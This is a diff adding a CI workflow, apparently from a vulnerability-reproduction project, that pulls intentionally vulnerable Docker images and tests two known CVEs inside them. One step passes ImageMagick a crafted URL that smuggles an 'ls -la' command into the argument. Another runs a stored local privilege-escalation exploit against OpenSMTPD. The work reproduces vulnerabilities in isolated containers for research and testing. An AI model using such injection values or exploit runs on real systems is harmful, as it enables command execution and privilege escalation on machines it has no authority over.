@@ -1,0 +1,51 @@
+name: Manual CVE Tests
+
+#This only runs after building and pushing dockers to ghcr
+on:
+  push:
+    branches:
+      - main
+    paths:
+      - .github/workflows/manual-docker-test.yml
+
+  workflow_run:
+    workflows: ["Build and Push containers to GHCR"]
+    types:
+      - completed
+
+jobs:
+
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+
+    - name: Pull docker (CVE-2016-3714)
+      run: |
+        docker pull ghcr.io/pi3dra/decret/cve-2016-3714:latest
+        docker tag ghcr.io/pi3dra/decret/cve-2016-3714:latest cve-2016-3714
+
+    - name: Test vuln (CVE-2016-3714)
+      run: |
+        docker run cve-2016-3714 apt-get install curl wget -y --force-yes -qq
+        #The command ls -la gets injected but generates an error so we return true instead
+        docker run cve-2016-3714 convert 'https://example.com";ls "-la' out.png || true
+        
+    - name: Pull docker (CVE-2020-7247)
+      run: |
+        docker pull ghcr.io/pi3dra/decret/cve-2020-7247:latest
+        docker tag ghcr.io/pi3dra/decret/cve-2020-7247:latest cve-2020-7247
+
+    - name: Test vuln (CVE-2020-7247)
+      run: |
+        #Setting up opensmtpd properly , read examples/CVE-2020-7247
+        docker run cve-2020-7247 sh -c "sed -i s/localhost/127.0.0.1/ /etc/smtpd.conf && /etc/init.d/opensmtpd start"
+        docker run cve-2020-7247 sh -c "/etc/init.d/opensmtpd start"
+        #Local privilege escalatioin
+        docker run cve-2020-7247 sh -c "apt-get install -y gcc -qq && su toto && whoami"
+        #Run LPE exploit
+        docker run cve-2020-7247 sh -c "perl /tmp/decret_copy/exploit_0_verified LPE && whoami"
+
+
+
